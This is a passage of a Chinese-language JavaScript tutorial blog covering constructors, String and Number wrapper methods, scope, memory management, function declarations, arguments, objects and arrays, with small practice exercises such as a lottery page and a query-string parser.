将构造函数的作用域给新对象，(即new Object()创建出的对象)，而函数体内的this就代表new Object() 出来的对象。 执行构造函数内的代码； 返回新对象(后台直接返回)。 关于this的使用，this其实就是代表当前作用域对象的引用。如果在全局范围this就代表window对象，如果在 构造函数体内，就代表当前的构造函数所声明的对象。 12var box = 2; alert(this.box); //全局，代表window 构造函数和普通函数的唯一区别，就是他们调用的方式不同。只不过，构造函数也是函数，必须用new运算符 来调用，否则就是普通函数。 123456var box = new Box(&#x27;Lee&#x27;, 100); //构造模式调用 alert(box.run()); Box(&#x27;Lee&#x27;, 20); //普通模式调用，无效 var o = new Object(); Box.call(o, &#x27;Jack&#x27;, 200) //对象冒充调用 alert(o.run()); 探讨构造函数内部的方法(或函数)的问题，首先看下两个实例化后的属性或方法是否相等。 12345var box1 = new Box(&#x27;Lee&#x27;, 100); //传递一致var box2 = new Box(&#x27;Lee&#x27;, 100); //同上alert(box1.name == box2.name); //true，属性的值相等alert(box1.run == box2.run); //false，方法其实也是一种引用地址alert(box1.run() == box2.run()); //true，方法的值相等，因为传参一致 可以把构造函数里的方法(或函数)用new Function()方法来代替，得到一样的效果，更加证明，他们最终判断 的是引用地址，唯一性。 12345function Box(name, age) &#123; //new Function()唯一性 this.name = name; this.age = age; this.run = new Function(&quot;return this.name + this.age + &#x27;运行中...&#x27;&quot;); &#125; 我们可以通过构造函数外面绑定同一个函数的方法来保证引用地址的一致性，但这种做法没什么必要，只是加 深学习了解： 12345678function Box(name, age) &#123; this.name = name; this.age = age; this.run = run; &#125; function run() &#123; //通过外面调用，保证引用地址一致 return this.name + this.age + &#x27;运行中...&#x27;; &#125; 虽然使用了全局的函数run()来解决了保证引用地址一致的问题，但这种方式又带来了一个新的问题，全局中的 this在对象调用的时候是Box本身，而当作普通函数调用的时候，this又代表window。 16.3 基本包装类型在基本数据类型中有3个特殊的存在：String、Number、Boolean，它们都有自己的包装对象，有相应的属性和方法，调用方法的过程是在后台发生的，所以我们称作为基本包装类型。 通俗讲就是基本类型的数据都有一个包装它们的类，这些类都有自己的属性和方法，这些基本类型的数据都可以直接去调用这些属性和方法。 16.3.1 基本包装类型概述123var box = &#x27;Mr．Lee&#x27;;//定义一个字符串 var box2 = box.substring(2); //截掉字符串前两位 alert(box2);//输出新字符串 方法A.substring(num)，截取字符串A前的num个字符。 变量box是一个字符串类型，而box.substring(2)又说明它是一个对象(PS：只有对象才会调用方法)，最后把处 理结果赋值给box2。’Mr．Lee’是一个字符串类型的值，按道理它不应该是对象，不应该会有自己的方法，比如： 12alert(&#x27;Mr．Lee&#x27;.substring(2)); //直接通过值来调用方法//不会报错，能正常运行并得到正确的值 ①字面量写法： 12345678910var box = &#x27;Mr．Lee&#x27;;//字面量 box.name = &#x27;Lee&#x27;;//无效属性 box.age = function () &#123;//无效方法 return 100; &#125;; alert(box);//Mr．Lee alert(box.substring(2));//．Lee alert(typeof box);//string alert(box.name);//undefined alert(box.age());//错误 ②new运算符写法： 12345678910var box = new String(&#x27;Mr．Lee&#x27;);//new运算符box.name = &#x27;Lee&#x27;;//有效属性box.age = function () &#123;//有效方法 return 100;&#125;;alert(box);//Mr．Leealert(box.substring(2));//．Leealert(typeof box);//objectalert(box.name);//Leealert(box.age());//100 以上字面量声明和new运算符声明很好的展示了他们之间的区别。但有一点还是可以肯定的，那就是不管字面 量形式还是new运算符形式，都可以使用它的内置方法。并且Boolean和Number特性与String相同，三种类型可 以成为基本包装类型。 PS：在使用new运算符创建以上三种类型的对象时，可以给自己添加属性和方法，但我们建议不要这样使用， 因为这样会导致根本分不清到底是基本类型值还是引用类型值。 16.3.2 Boolean类型Boolean类型没有特定的属性或者方法。 16.3.3 Number类型Number类型有一些静态属性(直接通过Number调用的属性，而无须new运算符)和方法。 Number静态属性 属性 描述 MAX_VALUE 表示最大数 MIN_VALUE 表示最小数 NaN 非数值 NEGATIVE_INFINITY 负无穷大，溢出返回该值 POSITIVE_INFINITY 正无穷大，溢出返回该值 prototype 原型，用于增加新属性和方法 Number(‘A’)：将A转换为数值型数据，如果字符不是纯数值组成的，结果转换为NaN。 1234567891011121314&lt;script&gt; console.log(Number.MAX_VALUE); //1.7976931348623157e+308 console.log(Number.MIN_VALUE); //5e-324 console.log(Number(&#x27;abc&#x27;)); //转化为数值 console.log(Number(&#x27;1345651&#x27;)); console.log(Number(&#x27;13232132abc&#x27;)); console.log(Number.NEGATIVE_INFINITY); // -Infinity console.log(Number.POSITIVE_INFINITY); //Infinity console.log(1/0);//Infinity console.log(-1/0);//-Infinity console.log(Number.prototype);&lt;/script&gt; Number对象的方法 方法 描述 toString() 将数值转化为字符串，并且可以转换进制 toLocaleString() 根据本地数字格式转换为字符串 toFixed() 将数字保留小数点后指定位数并转化为字符串 toExponential() 将数字以指数形式表示，保留小数点后指定位数并转化为字符串 toPrecision() 指数形式或点形式表述数，保留小数点后面指定位数并转化为字符串 方法 描述 toString() 将数值转化为字符串，并且可以转换进制 toLocaleString() 根据本地数字格式转换为字符串 toFixed() 将数字保留小数点后指定位数并转化为字符串 toExponential() 将数字以指数形式表示，保留小数点后指定位数并转化为字符串 toPrecision() 指数形式或点形式表述数，保留小数点后面指定位数并转化为字符串 valueOf 显示原始值 12345678910111213&lt;script&gt; var box = 1000.789; console.log(box); console.log(box.toString());//转换为字符串，传参可以转换进制 console.log(box.toString(16)); //16进制 console.log(box.toString(8)); //8进制 console.log(box.toString(2)); //8进制 console.log(box.toLocaleString());//本地形式，1,000.789 console.log(box.toFixed(2));//小数点保留，1000.78 console.log(box.toExponential());//指数形式，传参会保留小数点 console.log(box.toPrecision(3)); //指数或点形式，传参保留小数点 console.log(box.valueOf());&lt;/script&gt; 16.3.4 String类型String类型包含了三个属性和大量的可用内置方法。 属性 描述 length 返回字符串长度 constructor 返回创建String对象的函数 prototype 通过添加属性和方法扩展字符串定义 String也包含对象的通用方法，比如valueOf()、toLocaleString()和toString()方法，但这些方法都返回字符串的基本值。 123456//length方法 console.dir(String); let str1 = &#x27;July&#x27;; let str2 = new String(&#x27;mike taylor&#x27;); console.log(str1,str2); console.log(str1.length,str2.length); 16.3.4.2 字符方法 方法 描述 charAt(n) 返回指定索引位置的字符 charCodeAt(n) 以Unicode编码返回指定索引位置的字符 1234var box = &#x27;July&#x27;; alert(box.charAt(1));//u alert(box.charCodeAt(1));//117 alert(box[1]);//u，通过数组方式截取 PS：box[1]在IE浏览器会显示undefined，所以使用时要慎重。 16.3.4.3 字符串操作方法 方法 描述 concat(str1……str2) 将字符串参数串联到调用该方法的字符串 slice(n,m) 返回字符串n到m之间的位置（不包含m边界处），n可以省略 substring(n,m) 同上，n可以省略 substr(n,m) 返回字符串n开始的m个字符串，，n可以省略 1234567891011//字符串操作方法let str = &#x27;July Staying&#x27;;console.log(str.concat(&#x27;,&#x27;,&#x27;so&#x27;,&#x27;,&#x27;,&#x27;I am happy！&#x27;));console.log(str.slice(2,4)); // lyconsole.log(str.slice(7)); // 从第8个字符到最后，ayingconsole.log(str.substring(2,4));// lyconsole.log(str.substring(4));// 从第4个字符到最后， Stayingconsole.log(str.substring(-1,2)); //第一个参数为负数，表示反向截取，Juconsole.log(str.substring(1,-1)); //第二参为负，直接转0，并且方法会把较小的数字提前，这里等同于(0,1)，console.log(str.substr(2,4)); //ly Sconsole.log(str.substr(2,-3)); //第二参数为负，直接转0 ，(2,0)，&#x27;&#x27; PS：IE的JavaScript实现在处理向substr()方法传递负值的情况下存在问题，它会返回原始字符串，使用时要切 记。 16.3.4.4 字符串位置方法 方法 描述 indexOf(str, n) 从n开始搜索的第一个str(包括n端点处)，并将搜索的索引值返回，n默认为0 lastIndexOf(str, n) 从n开始搜索的最后一个str，并将搜索的索引值返回 123456var box = &#x27;Mr.Lee is Lee&#x27;; alert(box.indexOf(&#x27;L&#x27;));//3 alert(box.indexOf(&#x27;L&#x27;, 3));//3 alert(box.indexOf(&#x27;L&#x27;, 5));//10 alert(box.lastIndexOf(&#x27;L&#x27;));//10 alert(box.lastIndexOf(&#x27;L&#x27;, 5));//3，从指定的位置向前搜索 PS：如果没有找到想要的字符串，则返回-1。 示例：找出全部的L。 12345678var box = &#x27;Mr.Lee is Lee&#x27;;//包含两个L的字符串 var boxarr = [];//存放L位置的数组 var pos = box.indexOf(&#x27;L&#x27;);//先获取第一个L的位置 while (pos &gt; -1) &#123;//如果位置大于-1，说明还存在 boxarr.push(pos);//添加到数组 pos = box.indexOf(&#x27;L&#x27;, pos + 1);//从新赋值pos目前的位置 &#125; alert(boxarr);//输出 16.3.4.5 大小写转换方法 方法 描述 toLowerCase(str) 将字符串全部转换为小写 toUpperCase(str) 将字符串全部转换为大写 toLocaleLowerCase(str) 将字符串全部转换为小写，并且本地化 toLocaleupperCase(str) 将字符串全部转换为大写，并且本地化 1234567&lt;script&gt; var box = &#x27;Mr.Lee is Lee&#x27;; console.log(box.toLowerCase());//全部小写 console.log(box.toUpperCase());//全部大写 console.log(box.toLocaleLowerCase()); console.log(box.toLocaleUpperCase());&lt;/script&gt; PS：只有几种语言（如土耳其语）具有地方特有的大小写本地性，一般来说，是否本地化效果都是一致的。 16.3.4.6 字符串的模式匹配方法 方法 描述 match(pattern) 返回pattern 中的子串或null replace(pattern, replacement) 用replacement 替换pattern search(pattern) 返回字符串中pattern 开始位置 split(pattern) 返回字符串按指定pattern 拆分的数组 正则表达式在字符串中的应用，在前面的章节已经详细探讨过，这里就不再赘述了。 以上中match()、 replace()、serach()、split()在普通字符串中也可以使用。 1234567console.log(box.match(&#x27;Lee&#x27;)[0]); //Lconsole.log(box.match(/Lee/g)); //Lconsole.log(box.search(&#x27;Lee&#x27;));console.log(box.replace(&#x27;Lee&#x27;,&#x27;July&#x27;)); //只能替换一次 Mr.July is Leeconsole.log(box.split(&#x27; &#x27;)); //按照匹配的模板拆分字符串console.log(box.split(&#x27;&#x27;));//若为空，切割每个字符 16.3.4.7 其他方法 方法 描述 fromCharCode(ascii) 静态方法，输出ASCII码对应的值 str1.localeCompare(str2) 比较两个字符串，并返回相应的值（第一个字符串str1的ASCII码大于第二个字符串str2，返回1；第一个字符串str1的ASCII码小于第二个字符串str2，返回-1;相同返回0） 1234console.log(String.fromCharCode(82)); //Rconsole.log(&#x27;July&#x27;.localeCompare(box)); //-1console.log(&#x27;ZJL&#x27;.localeCompare(box)); //1console.log(&#x27;Mr.Lee is Lee&#x27;.localeCompare(box)); // 0 【扩展】 HTML方法。 方法 描述 anchor(name) &lt;a name=&#39;name&#39;&gt;str&lt;/a&gt;a&gt; big() &lt;big&gt;str&lt;big&gt; blink() &lt;blink&gt;str&lt;/blink&gt; bold() &lt;b&gt;Str&lt;/b&gt; fixed() &lt;tt&gt;Str&lt;/tt&gt; fontcolor(color) &lt;font color=&quot;color&quot;&gt;str&lt;/font&gt; fontcolor(color) &lt;font size=&quot;size&quot;&gt;str&lt;/font&gt; link(URL) &lt; a href=&quot; &quot;&gt;str&lt;/ a&gt; small() &lt;small&gt;str&lt;/small&gt; strike() &lt;strike&gt;str&lt;/strike&gt; italics() &lt;i&gt;italics&lt;/i&gt; sub() &lt;sub&gt;str&lt;/sub&gt; sup() &lt;sup&gt;str&lt;/sup&gt; 以上是通过JS生成一个html标签，没什么太大用处，做个了解。 12var box = &#x27;Lee&#x27;; // alert(box.link(&#x27;http://www.yc60.com&#x27;)); //超链接 16.4 变量、作用域及内存16.4.1 变量及作用域16.4.1.1 基本类型和引用类型的值ECMAScript变量可能包含两种不同的数据类型的值：基本类型值和引用类型值。基本类型值指的是那些保存 在栈内存中的简单数据段，即这种值完全保存在内存中的一个位置。而引用类型值则是指那些保存在堆内存中的对象，意思是变量中保存的实际上只是一个指针，这个指针指向内存中的另一个位置，该位置保存对象。 将一个值赋给变量时，解析器必须确定这个值是基本类型值，还是引用类型值。基本类型值有以下几种： Undefined、Null、Boolean、Number和String。这些类型在内存中分别占有固定大小的空间，他们的值保存在栈 空间，我们通过按值来访问的。 PS：在某些语言中，字符串以对象的形式来表示，因此被认为是引用类型。ECMAScript放弃这一传统。 基本类型的变量存储在栈中，可直接获取变量值；引用类型的变量存储在堆中，在栈中存储的是引用类型的变量的地址（指针），要获取引用类型变量的值，需要先从栈中获取地址，再按值查找，从而获取到值。 如果赋值的是引用类型的值，则必须在堆内存中为这个值分配空间。由于这种值的大小不固定，因此不能把它 们保存到栈内存中。但内存地址大小的固定的，因此可以将内存地址保存在栈内存中。这样，当查询引用类型的变 量时，先从栈中读取内存地址，然后再通过地址找到堆中的值。对于这种，我们把它叫做按引用访问。 16.4.1.2 动态属性定义基本类型值和引用类型值的方式是相似的：创建一个变量并为该变量赋值。但是，当这个值保存到变量中 以后，对不同类型值可以执行的操作则大相径庭。 123var box = new Object();//创建引用类型 box.name = &#x27;Lee&#x27;;//新增一个属性 alert(box.name);//输出 如果是基本类型的值添加属性的话，就会出现问题了。 123var box = &#x27;Lee&#x27;;//创建一个基本类型 box.age = 27;//给基本类型添加属性 alert(box.age);//undefined 16.4.1.3 复制变量值在变量复制方面，基本类型和引用类型也有所不同。基本类型复制的是值本身，而引用类型复制的是地址。 12var box = &#x27;Lee&#x27;; //在栈内存生成一个box &#x27;Lee&#x27; var box2 = box box2是虽然是box1的一个副本，但从图示可以看出，它是完全独立的。也就是说，两个变量分别操作时互不影响。 123var box = new Object(); //创建一个引用类型 box.name = &#x27;Lee&#x27;; //新增一个属性 var box2 = box; //把引用地址赋值给box2 在引用类型中，box2其实就是box，因为他们指向的是同一个对象。 如果这个对象中的name属性被修改了， box2.name和box.name输出的值都会被相应修改掉了。 16.4.2 内存问题JavaScript具有自动垃圾收集机制，也就是说，执行环境会负责管理代码执行过程中使用的内存。其他语言比 如C和C++，必须手工跟踪内存使用情况，适时的释放，否则会造成很多问题。而JavaScript则不需要这样，它会自 行管理内存分配及无用内存的回收。 JavaScript最常用的垃圾收集方式是标记清除。垃圾收集器会在运行的时候给存储在内存中的变量加上标记。 然后，它会去掉环境中正在使用变量的标记，而没有被去掉标记的变量将被视为准备删除的变量。最后，垃圾收集器完成内存清理工作，销毁那些带标记的值并回收他们所占用的内存空间。 垃圾收集器是周期性运行的，这样会导致整个程序的性能问题。比如IE7以前的版本，它的垃圾收集器是根据内存分配量运行的，比如256个变量就开始运行垃圾收集器，这样，就不得不频繁地运行，从而降低的性能。 一般来说，确保占用最少的内存可以让页面获得更好的性能。那么优化内存的最佳方案，就是一旦数据不再有用，那么将其设置为null来释放引用，这个做法叫做解除引用。这一做法适用于大多数全局变量和全局对象。 12var o = &#123;name : &#x27;Lee&#x27;&#125;; o = null;//解除对象引用，等待垃圾收集器回收 16.4.3 作用域在ES5作用域分为全局作用域和局部作用域两种。 在ES6作用域分为全局作用域、局部作用域、块级作用域三种。 全局作用域：定义在函数外部的变量拥有全局作用域。 局部作用域：定义在函数内部的变量拥有全局作用域。 1234567891011121314&lt;script&gt; console.log(x); // var定义的变量存在位置提升，该变量默认值为undefi var x = 123; //这里的x是一个全局变量 function fn1()&#123; //外部定义的函数是全局变量，函数的形参是局部变量。 var abc = 666; console.log(x); console.log(abc) &#125; function fn2()&#123; console.log(x+10); &#125; fn1();fn2(); console.log(abc); // abc is not defined&lt;/script&gt; 16.6 实训 1、用js写一个抽奖程序，奖品自定，点击开始按钮开始随机，点击停止按钮停止随机出现奖品。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;main&gt; &lt;button name=&quot;start&quot;&gt;抽奖&lt;/button&gt; &lt;button name=&quot;stop&quot;&gt;停止&lt;/button&gt; &lt;/main&gt; &lt;span&gt;&lt;/span&gt;&lt;/body&gt; &lt;script&gt; let str = null; let start = document.querySelector(`[name = start]`); start.addEventListener(&#x27;click&#x27;,function()&#123; console.log(&#x27;点击&#x27;); let x = Math.random()*10; if(x&lt;0.1)&#123; str = &#x27;特等奖&#x27;; &#125;else if(x&lt;0.5)&#123; str = &#x27;一等奖&#x27;; &#125;else if(x&lt;2)&#123; str = &#x27;二等奖&#x27;; &#125;else if(x&lt;5)&#123; str = &#x27;三等奖&#x27;; &#125;else&#123; str = &#x27;很遗憾，你未能中奖！&#x27; &#125; document.querySelector(&quot;span&quot;).innerHTML = &quot;正在抽奖&quot;+x; &#125;); let stop = document.querySelector(`[name = stop]`); stop.addEventListener(&#x27;click&#x27;,function()&#123; document.querySelector(&quot;span&quot;).innerHTML = str; &#125;) &lt;/script&gt;&lt;/html&gt; 方案二： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;实训1&lt;/title&gt; &lt;style&gt; .box&#123; width: 400px; height: 400px; border: 2px solid deeppink; margin: 0 auto; color: #fff; &#125; .gift&#123; height: 40px; line-height: 40px; font-size: 18px; text-align: center; background-color: deeppink; &#125; button&#123; width: 70px; height: 30px; background-color: #00f; color: #fff; margin-top: 10px; outline: none; &#125; #start&#123; margin-left: 120px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;gift&quot;&gt;开始抽奖啦！&lt;/div&gt; &lt;button id=&quot;start&quot;&gt;开始&lt;/button&gt; &lt;button id=&quot;stop&quot;&gt;停止&lt;/button&gt;&lt;/div&gt;&lt;script&gt; // 需求：用js写一个抽奖程序，奖品自定，点击开始按钮开始随机，点击停止按钮停止随机出现奖品。 var gifts = [ &#x27;希望您下次中奖&#x27;, &#x27;笔记本电脑&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;矿泉水一瓶&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;抽纸一包&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;矿泉水一瓶&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;抽纸一包&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;矿泉水一瓶&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;抽纸一包&#x27;, &#x27;希望您下次中奖&#x27;, &#x27;矿泉水一瓶&#x27; ]; var gift = document.querySelector(&#x27;.gift&#x27;); var start = document.querySelector(&#x27;#start&#x27;); var stop = document.querySelector(&#x27;#stop&#x27;); var timer = null; // 抽奖 start.onclick = function () &#123; timer = setInterval(function () &#123; for(var i=0;i&lt;gifts.length;i++)&#123; gift.innerHTML = gifts[Math.floor(Math.random() * gifts.length)] &#125; &#125;,40) &#125;; // 停止抽奖 stop.onclick = function () &#123; clearInterval(timer); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 2、传入字符串’ ?name=前端开发&amp;blog=http://miketaylorjuly123.cn&#39;; 写一个js函数返回 {‘name’:’前端开发’,’blog’:’ http://miketaylorjuly123.cn&#39;} 。 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;content&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; let str = &#x27; ?name=前端开发&amp;blog=http://miketaylorjuly123.cn&#x27;; function purfy(obj)&#123; obj = obj.replace(/ \\?/,&#x27;&#x27;); let res1 = obj.split(&#x27;\\&amp;&#x27;); let res2 =[]; let res = &#123;&#125;; for(var a in res1)&#123; res2.push(res1[a].split(&#x27;=&#x27;)); &#125; for(a in res2)&#123; res[res2[a][0]] = res2[a][1]; &#125; return res; &#125; console.log(purfy(str)); &lt;/script&gt;&lt;/html","categories":[],"tags":[{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"}]},{"title":"JavaScript高级","slug":"前端学习16","date":"2021-05-30T11:47:35.000Z","updated":"2021-05-30T14:42:01.994Z","comments":true,"path":"2021/05/30/前端学习16/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/30/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A016/","excerpt":"","text":"第15章 JavaScript高级课程介绍 函数 对象和数组 时间和日期 正则表达式 Function类型 15.1 函数什么是函数函数是定义一次但却可以调用或执行任意多次的一段JS代码。函数有时会有参数，即函数被调用时指定了值的 局部变量。函数常常使用这些参数来计算一个返回值，这个值也成为函数调用表达式的值。（JS代码的封装） 15.1.1 函数的声明函数声明的概念函数对任何语言来说都是一个核心的概念。通过函数可以封装任意多条语句，而且可以在任何地方、任何时候 调用执行。ECMAScript中的函数使用function关键字来声明，后跟一组参数以及函数体。 12345678function box() &#123; //没有参数的函数alert(&#x27;只有函数被调用，我才会被之执行&#x27;);&#125; box(); //直接调用函数function box(name, age) &#123; //带参数的函数alert(&#x27;你的姓名：&#x27;+name+&#x27;，年龄：&#x27;+age);&#125; box(&#x27;Mr.Koo&#x27;,26); //调用函数，并传参 格式 function 函数名（[形参列表]）&#123; 函数体； [return [&lt;表达式&gt;];] &#125; /*调用*/ 函数名 ([实参列表]); 1234567* ```js var 变量名 = function（[形参列表]）&#123; 函数体； [return [&lt;表达式&gt;];] &#125; 函数名 ([实参列表]); //主要用于封装中。 (function（[形参列表]）&#123; 函数体； [return [&lt;表达式&gt;];] &#125;)([实参列表]); //立即执行函数，自动调用自身，不能在其他地方被调用，一般用于JS库或JS插件的封装或闭包处理。 123456789101112131415161718```html//立即执行函数&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;IIFE&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; (function(a,b,c,d)&#123; var res = a+b+c+d; console.log(res);//返回结果NaN，因为undefined无法转换为一个数值 &#125;)(1,10,100,1000);//主要加分号 &lt;/script&gt;&lt;/html&gt; 注意： 函数不会自动执行（IIFE（立即执行函数）除外），必须通过调用才能执行。 传入的实参个数多于形参，多余会被忽略。形参个数超过实参，如果形参没有与实参匹配的值那么形参的值默认为undefined。 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; function sum(a,b,c,d)&#123; var res = a+b+c+d;// 1 2 3 undefined console.log(res);//返回结果NaN，因为undefined无法转换为一个数值 &#125; sum(1,2,3); &lt;/script&gt;&lt;/html&gt; 15.1.2 return返回值return返回值 带参和不带参的函数，都没有定义返回值，而是调用后直接执行的。实际上，任何函数都可以通过return语句 跟后面的要返回的值来实现返回值。把函数的返回值赋给一个变量，然后通过变量进行操作。return语句还有一个 功能就是退出当前函数，不再执行之后的语句。 123456function box(num1, num2) &#123; return num1 * num2; alert(num1); //return之后这句不再执行&#125; var num = box(10, 5); //函数得到的返回值赋给变量 alert(num); 15.1.3 arguments对象什么是arguments对象ECMAScript函数不介意传递进来多少参数，也不会因为参数不统一而错误。函数体内可以通过arguments对象来接收传递进来的参数。arguments对象的length属性可以得到参数的数量。 我们可以利用length这个属性，来智能的判断有多少参数，然后把参数进行合理的应用。比如，要实现一个加法运算，将所有传进来的数字累加，而数字的个数又不确定。 返回实参列表的一个伪数组，一般用于不确定传过来的实参的个数的情况。 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;arguments对象&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; // function sum()&#123; // console.log(arguments.length); // console.log(arguments); // &#125; // sum(1,2,3); // sum(10,20,30,40,50); function sum()&#123; var sum = 0; for(var i = arguments.length;i&gt;0;i--)&#123;/*arguments获取实参个数*/ sum += arguments[i-1]; &#125; console.log(sum); &#125; sum(1,2,3); sum(10,20,30,40,50); &lt;/script&gt;&lt;/html&gt; 15.2 对象和数组什么是对象对象，其实就是一种类型，即引用类型。而对象的值就是引用类型的实例。在ECMAScript中引用类型是一种 数据结构，用于将数据和功能组织在一起。它也常被称做为类，但ECMAScript中却没有这种东西。虽然 ECMAScript是一门面向对象的语言，却不具备传统面向对象语言所支持的类和接口等基本结构。 15.2.1 object类型什么是object类型Object是在javascript中一个被我们经常使用的类型，而且JS中的所有对象都是继承自Object对象的。创建 Object类型有两种：一种是使用new运算符，一种是字面量表示法。 对象由属性和方法组成，通常用键值对定义。 创建Object 使用new运算符创建Object 123var box = new Object(); //new方式 box.name = &#x27;Mr.Koo&#x27;; //创建属性字段 box.age = 26; 使用字面量创建Object 123var box = &#123;&#125;; //字面量方式声明空的对象 box.name = &#x27;Mr.Koo&#x27;; //点符号给属性复制 box.age = 26; object两种属性输出方式 12345var box = &#123;&#125;; //字面量方式声明空的对象 box.name = &#x27;Mr.Koo&#x27;; //点符号给属性复制 box.age = 26;alert(box.name); //点表示法输出 alert(box[&#x27;age&#x27;]); //中括号表示法输出，注意引号 给对象创建方法 12345var box = &#123; run : function () &#123; //对象中的方法 return &#x27;加入前端学习，实现你的梦想！&#x27;; &#125; &#125; 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var obj1 = new Object(); obj1.name = &#x27;张三&#x27;; obj1.age = 19; obj1.fn = function () &#123; console.log(&#x27;我是FW！&#x27;); &#125; console.log(obj1); console.log(obj1.name); obj1.fn(); console.log(obj1[&#x27;name&#x27;]); var obj2 = new Object(&#123;//创建对象的同时对对象进行实例化 sex: &#x27;man&#x27;, hobby: &#x27;game&#x27;, erciyuan: true, &#125;); var obj3 = &#123; sex: &#x27;man&#x27;, hobby: &#x27;game&#x27;, erciyuan: true,&#125;; console.log(obj3) &lt;/script&gt;&lt;/html&gt; 单引号套双引号，双引号套单引号。 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;对象方法调用&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var str = &#x27;name&#x27;; var obj = &#123; name:&#x27;aa&#x27;, &#125; console.log(obj.str);//undefined.当属性名为一个变量时，必须用A.[B]取值，且不能加引号，因为它是变量。 console.log(obj[str]);//aa &lt;/script&gt;&lt;/html&gt; 当属性名为一个变量时，必须用A.[B]取值，且不能加引号，因为它是变量。 15.2.2 Array类型Array类型是什么除了Object类型之外，Array类型是ECMAScript最常用的类型。而且ECMAScript中的Array类型和其他语言中 的数组有着很大的区别。虽然数组都是有序排列，但ECMAScript中的数组每个元素可以保存任何类型。 ECMAScript中数组的大小也是可以调整的。 数组将一组数据组合到一起，并存入一个变量中，数组是有序排列的，占用一段连续的内存空间。 创建Array类型有两种方式： 第一种是new运算符，第二种是字面 量。 使用new运算符创建数组 1234var box = new Array(); //创建了一个数组 var box = new Array(10); //创建一个包含10个元素的数组 var box = new Array(&#x27;Mr.Koo&#x27;,26,&#x27;teacher&#x27;,&#x27;广州&#x27;); //创建一个数组并分配好了元素//以上三种方法，都可以省略new关键字 使用字面量方式创建数组 1234var box = []; //创建一个空的数组 var box = [&#x27;Mr.Koo&#x27;,26,&#x27;teacher&#x27;,&#x27;广州&#x27;]; //创建包含元素的数组 var box = [1,2,]; //禁止这么做，IE会识别3个元素 var box = [,,,,,]; //同样，IE的会有识别问题 使用索引下标来读取数组的值 123456var box = [&#x27;Mr.Koo&#x27;,26,&#x27;teacher&#x27;,&#x27;广州&#x27;]; //创建包含元素的数组 alert(box[2]); //获取第三个元素 box[2] = &#x27;student&#x27;; //修改第三个元素 box[4] = &#x27;计算机编程&#x27;; //增加第五个元素alert(box);//数组名[下标]，下标可以是一个数值型常量，也可以是一个表达式或函数或变量 使用length属性获取数组元素量 12345var box = [&#x27;Mr.Koo&#x27;,26,&#x27;teacher&#x27;,&#x27;广州&#x27;]; //创建包含元素的数组alert(box.length) //获取元素个数 box.length = 10; //强制元素个数 box[box.length] = &#x27;JS技术&#x27;; //通过length给数组增加一个元素alert(box); 数组末尾添加元素 数组名[数组名.length] = 值。 数组遍历，循环/多重循环 1234567891011121314151617&lt;script&gt;var message = [2,0,1,9,0,9,1,2,0,2,0,1,0];//for循环for(var i =0;i&lt;message.length;i++)&#123; console.log(message[i]);&#125; //for……in循环,推荐for(var a in message)&#123; console.log(message[a]);&#125; //forEach循环message.forEach(function (value,index)&#123; console.log(index,value);&#125;)&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;二维数组遍历&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var message = [[2, 0, 1, 9, 0, 9, 1, 2, 0, 2, 0, 1, 0], [2, 0, 1, 9, 0, 9, 1, 2, 0, 2, 0, 2, 5], [2, 0, 1, 9, 